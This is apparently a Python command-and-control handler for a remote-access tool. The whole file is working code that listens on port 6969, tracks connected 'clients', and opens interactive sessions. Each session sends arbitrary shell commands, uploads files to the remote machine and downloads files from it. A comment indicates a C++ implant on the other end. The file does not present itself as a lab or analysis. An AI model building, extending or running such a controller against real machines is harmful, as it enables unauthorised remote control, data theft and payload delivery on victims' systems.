import socket
import threading
import sys
import os
from datetime import datetime 

# Global dictionary to store active connections
# Key: Integer ID, Value: (socket object, address tuple)
active_clients = {}
client_count = 0
def start_server(host='0.0.0.0', port=6969):
    """
    Initializes the server socket and starts the accept thread.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Server listening on {host}:{port}")
    except Exception as e:
        print(f"[!] Bind failed: {e}")
        return

    # Start a separate thread to handle incoming connections
    # This prevents the main menu from freezing while waiting for clients.
    accept_thread = threading.Thread(target=accept_connections, args=(server,))
    accept_thread.daemon = True # Daemon threads exit when the main program exits
    accept_thread.start()

    # Enter the main interactive menu
    admin_console()
def accept_connections(server_socket):
    """
    Loop that constantly waits for new devices to connect.
    """
    global client_count
    while True:
        try:
            client_sock, addr = server_socket.accept()
            active_clients[client_count] = (client_sock, addr)
            print(f"\n[*] New connection from {addr}. ID: {client_count}")
            print("Admin > ", end="", flush=True) # Re-print prompt
            
            client_count += 1
        except Exception as e:
            print(f"[!] Error accepting connection: {e}")
            break

def interact_with_client(client_id):
    """
    Sub-loop for interacting with a specific client.
    Equivalent to the 'connect' function.
    """

    if client_id not in active_clients:
        print("[!] Invalid Client ID")
        return

    target_socket, target_addr = active_clients[client_id]
    target_socket.settimeout(20.0)
    
    print(f"[*] Entering session with {target_addr}. Type 'background' to return to menu.")

    while True:
        try:
            cmd = input(f"Session [{client_id}]> ")
            if not cmd:
                continue
            if cmd.lower() == "background":
                print("[*] Backgrounding session...")
                break

            elif cmd.startswith("upload"):
                try:
                    parts = cmd.split()
                    if len(parts) != 3:
                        print("[!] Usage: upload <local_path> <remote_path>")
                        continue
                    local_path = parts[1]
                    remote_path = parts[2]

                    try:
                        with open(local_path, "rb") as f:
                            file_data = f.read()
                            file_size = len(file_data)
                    except FileNotFoundError:
                        print(f"[!] Local file '{local_path}' not found.")
                        continue
                    target_socket.send(f"upload {remote_path} {file_size}".encode())
                    ack = target_socket.recv(1024).decode()
                    if "READY" in ack:
                        print(f"[*] Sending {file_size} bytes...")
                        target_socket.sendall(file_data)
                        print("[+] Upload finished.")
                        flush_socket(target_socket) # clean up buffer
                    else:
                        # FIX: Print the error message sent by C++
                        print(f"[!] Upload Failed. Remote said: {ack.strip()}")

                except Exception as e:
                    print(f"[!] Upload Error: {e}")
                continue
            elif cmd.startswith("getfile"):
                try:
                    parts = cmd.split()
                    if len(parts) != 2:
                        print("[!] Usage: getfile <remote_path>")
                        continue

                    remote_path = parts[1]
                    data_folder = datetime.now().strftime("Downloads_%y_%m_%d")

                    if not os.path.exists(data_folder):
                        os.makedirs(data_folder)
                        print(f"[*] Created download folder: {data_folder}")
                    filename = remote_path.split("/")[-1]
                    if not filename:
                        filename = f"downloaded_{int(datetime.now().timestamp())}.bin"
                        
                    local_path = os.path.join(data_folder, filename)


                    target_socket.send(f"getfile {remote_path}".encode())
                    header_buffer = ""
                    while "\n" not in header_buffer:
                        header_buffer += target_socket.recv(1).decode()
                    if "ERROR" in header_buffer:
                        print(f"[!] Server reported: {header_buffer}")
                        continue

                    if header_buffer.startswith("FILE:"):
                        file_size = int(header_buffer.strip().split(":")[1])
                        print(f"[*] Downloading {file_size} bytes to '{local_path}'...")

                        with open(local_path, "wb") as f:
                            receive = 0
                            while receive < file_size:

                                chunk_size = 4096
                                if file_size - receive < chunk_size:
                                    chunk_size = file_size - receive
                                chunk = target_socket.recv(chunk_size)
                                if not chunk_size:
                                    break

                                receive += len(chunk)
                                f.write(chunk)
                        print("[+] Download finished.")
                        flush_socket(target_socket) # clean up buffer
                except Exception as e:
                    print(f"[!] Download Error: {e}")
                continue
            target_socket.send(cmd.encode())
            try:
                full_response = ""
                while True:
                    chunk = target_socket.recv(4096).decode('utf-8', errors='replace')
                    if not chunk:
                        break
                    full_response += chunk
                    if "!!END!!" in full_response:
                        break
                print(full_response.replace("!!END!!", ""))

            except socket.timeout:
                print("[!] Timeout waiting for response")
        except Exception as e:
            print(f"[!] Session Error: {e}")
            break

def admin_console():
    """
    Main Loop: Handles 'list', 'connect', and 'help'.
    """
    while True:
        try:
            cmd = input("Admin > ").strip().split()
            if not cmd:
                continue
            
            action = cmd[0].lower()

            if action == "list":
                print("\n--- Connected Clients ---")
                for c_id, (sock, addr) in active_clients.items():
                    # Check if socket is actually healthy (basic check)
                    print(f"ID: {c_id} | IP: {addr[0]} | Port: {addr[1]}")
                print("-------------------------\n")

            elif action == "connect":
                if len(cmd) < 2:
                    print("[!] Usage: connect <id>")
                    continue
                try:
                    target_id = int(cmd[1])
                    interact_with_client(target_id)
                except ValueError:
                    print("[!] ID must be a number")

            elif action == "exit":
                print("[*] Shutting down server.")
                sys.exit(0)

            elif action == "help":
                print("Commands: list, connect <id>, exit")

            else:
                print("[!] Unknown command")

        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break


if __name__ == "__main__":
    start_server()
